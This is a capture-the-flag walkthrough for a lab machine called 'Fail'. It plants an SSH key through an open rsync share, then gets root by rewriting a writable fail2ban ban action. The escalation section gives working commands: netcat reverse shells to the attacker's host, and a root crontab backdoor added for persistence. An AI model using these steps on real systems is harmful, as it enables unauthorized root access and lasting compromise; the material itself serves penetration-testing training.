____

# Exploitation Guide for Fail

## Summary

In this walkthrough, we'll exploit the target via an open `rsync` share on a system user's home directory, allowing us to read and write files in that directory. This will enable us to upload our SSH public key and log in as the user. We'll then escalate by abusing misconfigured service and file permissions in the `fail2ban` security software.

## Enumeration

### Nmap

We'll begin with an `nmap` scan.

```
kali@kali:~$ sudo nmap 192.168.120.149          
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-19 08:11 EST
Nmap scan report for 192.168.120.149
Host is up (0.047s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
873/tcp open  rsync
```

We find ports 22 and 873 open. Port 873 reports as `rsync`.

### Rsync Enumeration

Rsync is a utility for efficiently transferring and synchronizing files on a network. Let's further enumerate port 873. To do that, we'll first need to install the `rsync` package on our attack machine:

```
kali@kali:~$ sudo apt-get install rsync -y               
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following NEW packages will be installed:
  rsync
...
kali@kali:~$
```

We can now use `rsync` to list available modules (essentially directory shares) on the target:

```
kali@kali:~$ rsync -rdt rsync://192.168.55.126:873
fox             fox home
```

This indicates that the `fox` module is available. The `fox home` string suggests `fox` may be a user on this system.

### Netcat

Let's try to connect to `rsync` with Netcat.

```
kali@kali:~$ nc -nv 192.168.120.149 873 
@RSYNCD: 31.0

```

The terminal seems to hang. Let's type `@RSYNCD: 31.0` and hit Enter.

```
kali@kali:~$ nc -nv 192.168.120.149 873 
@RSYNCD: 31.0
@RSYNCD: 31.0

```

Let's determine if this module requires authentication by simply entering `fox`.

```
kali@kali:~$ nc -nv 192.168.120.149 873
(UNKNOWN) [192.168.120.149] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
fox
@RSYNCD: OK
^C
kali@kali:~$
```

Great! It appears we can use this module without any authentication.

## Exploitation

### Open Rsync Share

Since the module doesn't require authentication, we can freely download all files inside the `fox` user's _/home/fox_ directory with `rsync`. Before we do that though, we need to switch to another directory so that the downloaded files do not overwrite our own.

```
kali@kali:~$ mkdir rsync-share
kali@kali:~$ cd rsync-share
kali@kali:~/rsync-share$ rsync -av fox@192.168.120.149::fox/ .
receiving incremental file list
./
.bash_history -> /dev/null
.bash_logout
.bashrc
.profile
...
kali@kali:~/rsync-share$ ls -la
total 24
drwxr-xr-x  2 kali kali 4096 Dec  3 15:22 .
drwxr-xr-x 44 kali kali 4096 Jan 19 08:02 ..
lrwxrwxrwx  1 kali kali    9 Dec  3 15:22 .bash_history -> /dev/null
-rw-r--r--  1 kali kali  220 Apr 18  2019 .bash_logout
-rw-r--r--  1 kali kali 3526 Apr 18  2019 .bashrc
...
```

This worked perfectly. We could investigate these files, but there may be much more we can do with this foothold. We may also be able to upload files to the share.

### SSH

Since our Nmap scan showed that the SSH service is running on the target, let's create a _.ssh_ folder inside the user's home directory and then upload our SSH public key (**id_rsa.pub**) as **.ssh/authorized_keys**. We'll begin by creating the required directory locally.

```
kali@kali:~/rsync-share$ mkdir fox/.ssh -p
```

If we don't already have an SSH key pair, we can create one with `ssh-keygen`:

```
kali@kali:~/rsync-share$ mkdir ~/.ssh
kali@kali:~/rsync-share$ ssh-keygen -t rsa -N '' -f ~/.ssh/id_rsa
Generating public/private rsa key pair.
...
```

Let's copy our public key into the user's SSH folder and save it there as **authorized_keys**.

```
kali@kali:~/rsync-share$ cp ~/.ssh/id_rsa.pub fox/.ssh/authorized_keys
```

Next, we'll upload the folder containing our public key back to the target.

```
kali@kali:~/rsync-share$ rsync -avp fox/ fox@192.168.120.149::fox/
sending incremental file list
./
.ssh/
.ssh/authorized_keys

sent 735 bytes  received 46 bytes  520.67 bytes/sec
total size is 563  speedup is 0.72
```

After uploading our public key, we should be able to connect via SSH as `fox`.

```
kali@kali:~/rsync-share$ cd ..
kali@kali:~$ ssh -i /home/kali/.ssh/id_rsa fox@192.168.120.149
...
$ bash
fox@fail:~$ id
uid=1000(fox) gid=1001(fox) groups=1001(fox),1000(fail2ban)
```

## Escalation

### Process Enumeration with PSpy

The output of the `id` command indicates that this user is in the `fail2ban` group. Let's download the [pspy](https://github.com/DominicBreuker/pspy) process monitoring tool to the target to help us enumerate scheduled jobs. We'll host it on our attack machine with a python web server.

```
kali@kali:~$ sudo python3 -m http.server 80                                     
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Next, we'll download it to the target, give it executable permissions, and run it.

```
fox@fail:~$ wget http://192.168.118.5/pspy64
--2021-01-19 09:33:17--  http://192.168.118.5/pspy64
Connecting to 192.168.118.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                        100%[=================================================================================================>]   2.94M   667KB/s    in 4.5s    

2021-01-19 09:33:22 (673 KB/s) - ‘pspy64’ saved [3078592/3078592]

fox@fail:~$ 
fox@fail:~$ chmod +x pspy64
fox@fail:~$
fox@fail:~$ ./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
...
2021/01/19 09:35:01 CMD: UID=0    PID=1903   | /bin/sh -c /usr/bin/systemctl restart fail2ban 
2021/01/19 09:35:01 CMD: UID=0    PID=1904   | /sbin/init 
2021/01/19 09:35:02 CMD: UID=0    PID=1905   | /sbin/init 
2021/01/19 09:35:02 CMD: UID=0    PID=1906   | /sbin/init 
2021/01/19 09:35:02 CMD: UID=0    PID=1908   | /usr/bin/python3 /usr/bin/fail2ban-server -xf start 
2021/01/19 09:35:02 CMD: UID=0    PID=1909   | /usr/bin/python3 /usr/bin/fail2ban-server -xf start 
2021/01/19 09:36:01 CMD: UID=0    PID=1912   | /usr/sbin/CRON -f 
2021/01/19 09:36:01 CMD: UID=0    PID=1913   | /usr/sbin/CRON -f 
2021/01/19 09:36:01 CMD: UID=0    PID=1914   | /bin/sh -c /usr/bin/systemctl restart fail2ban
```

The process monitor shows that a cron job runs every minute as root (`UID=0`) and uses `systemctl` to restart `fail2ban`.

### File2Ban Enumeration

We discover **README.fox** inside _/etc/file2ban_.

```
fox@fail:~$ ls -l /etc/fail2ban/
total 64
drwxrwxr-x 2 root fail2ban  4096 Dec  3 15:22 action.d
-rw-r--r-- 1 root root      2334 Jan 18  2018 fail2ban.conf
drwxr-xr-x 2 root root      4096 Sep 23  2018 fail2ban.d
drwxr-xr-x 3 root root      4096 Dec  3 15:22 filter.d
-rw-r--r-- 1 root root     22910 Nov 19 04:12 jail.conf
drwxr-xr-x 2 root root      4096 Dec  3 15:22 jail.d
-rw-r--r-- 1 root root       645 Jan 18  2018 paths-arch.conf
-rw-r--r-- 1 root root      2827 Jan 18  2018 paths-common.conf
-rw-r--r-- 1 root root       573 Jan 18  2018 paths-debian.conf
-rw-r--r-- 1 root root       738 Jan 18  2018 paths-opensuse.conf
-rw-r--r-- 1 root root        87 Dec  3 15:22 README.fox
```

The file contains the following line:

```
fox@fail:~$ cat /etc/fail2ban/README.fox 
Fail2ban restarts each 1 minute, change ACTION file following Security Policies. ROOT!
```

This suggests that we can modify various action configuration files. Let's verify this by checking the file permissions in _/etc/fail2ban/action.d_.

```
fox@fail:~$ ls -l /etc/fail2ban/action.d
total 280
-rw-rw-r-- 1 root fail2ban  3879 Jan 18  2018 abuseipdb.conf
-rw-rw-r-- 1 root fail2ban   587 Jan 18  2018 apf.conf
-rw-rw-r-- 1 root fail2ban   629 Jan 18  2018 badips.conf
-rw-rw-r-- 1 root fail2ban 10918 Jan 18  2018 badips.py
...
```

According to the permissions, we can write to these configuration files. Next, let's view the contents of **/etc/fail2ban/jail.conf**.

```
fox@fail:~$ cat /etc/fail2ban/jail.conf
bantime  = 1m
...
banaction = iptables-multiport
...
#
# SSH servers
#

[sshd]
enabled = true
...
```

We find that the SSH service is enabled in `fail2ban`. The `MISCELLANEOUS OPTIONS` indicate a one min ute ban time is set. The `ACTIONS` section indicates that the ban action for a failed login attempt uses the `iptables-multiport` action configuration file.

The **/etc/fail2ban/action.d/iptables-multiport.conf** action file contains the following action:

```
fox@fail:~$ cat /etc/fail2ban/action.d/iptables-multiport.conf
# Fail2Ban configuration file
...
# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
...
```

This action will ban an IP address for a minute after a failed login attempt.

### Reverse Shell

Since we are able to write to these configuration files, we can replace the ban action in **iptables-multiport.conf** with a command of our choosing. Let's check for the existance of Netcat on the system.

```
fox@fail:~$ which nc
/usr/bin/nc
fox@fail:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

Netcat is installed and is in our PATH. Next, let's check the location of `bash`.

```
fox@fail:~$ which bash
/usr/bin/bash
```

We can use Netcat as a simple reverse shell by replacing the action ban command with `nc 192.168.118.5 4444 -e /usr/bin/bash`.

```
fox@fail:~$ sed -i 's:actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>:actionban = nc 192.168.118.5 4444 -e /usr/bin/bash:g' /etc/fail2ban/action.d/iptables-multiport.conf
fox@fail:~$
```

Let's wait a minute for crontab to run and restart `fail2ban` with our new configuration. While we wait, we'll start a Netcat listener on port 4444.

```
kali@kali:~$ nc -lvp 4444 
listening on [any] 4444 ...
```

After a minute, we must purposefully fail an SSH login to trigger our ban action. We'll log in as `fox` with a known banned password. We may need to do this a few times.

```
kali@kali:~$ ssh fox@192.168.120.149
fox@192.168.120.149's password: 
Permission denied, please try again.
fox@192.168.120.149's password:
```

If everything worked as expected, our Netcat listener should catch our reverse shell.

```
kali@kali:~$ nc -lvp 4444
listening on [any] 4444 ...
192.168.120.149: inverse host lookup failed: Unknown host
connect to [192.168.118.5] from (UNKNOWN) [192.168.120.149] 36774
python -c 'import pty; pty.spawn("/bin/bash")'
root@fail:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

### Persistence

Unfortunately, our root shell dies after exactly one minute. This is not surprising and is due to the one-minute SSH ban time from our enumeration. Since the process that triggers our shell only runs for one minute, our shell will terminate when the process stops.

We could achieve persistence in a variety of ways. In this case, we'll create a cron job as root to execute our Netcat reverse shell every minute. From our stable SSH session, let's change the ban action command to create the cron job and append it to the **/etc/crontab** file.

```
fox@fail:~$ sed -i 's:actionban = nc 192.168.118.5 4444 -e /usr/bin/bash:actionban = echo "*  *  *  *  * root nc 192.168.118.5 4444 -e /usr/bin/bash" >> /etc/crontab:g' /etc/fail2ban/action.d/iptables-multiport.conf
fox@fail:~$
```

We'll restart our listener on port 4444 and wait another minute for `fail2ban` to be restarted with the new configuration.

```
kali@kali:~$ nc -lvp 4444
listening on [any] 4444 ...
```

To trigger our shell, we will once again purposely fail our SSH authentication.

```
kali@kali:~$ ssh fox@192.168.120.149
fox@192.168.120.149's password: 
Permission denied, please try again.
fox@192.168.120.149's password:
```

After one minute, the cron job executes our shell, and we obtain a stable connection that will not drop.

```
kali@kali:~$ nc -lvp 4444
listening on [any] 4444 ...
192.168.120.149: inverse host lookup failed: Unknown host
connect to [192.168.118.5] from (UNKNOWN) [192.168.120.149] 36862
python -c 'import pty; pty.spawn("/bin/bash")'
root@fail:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```
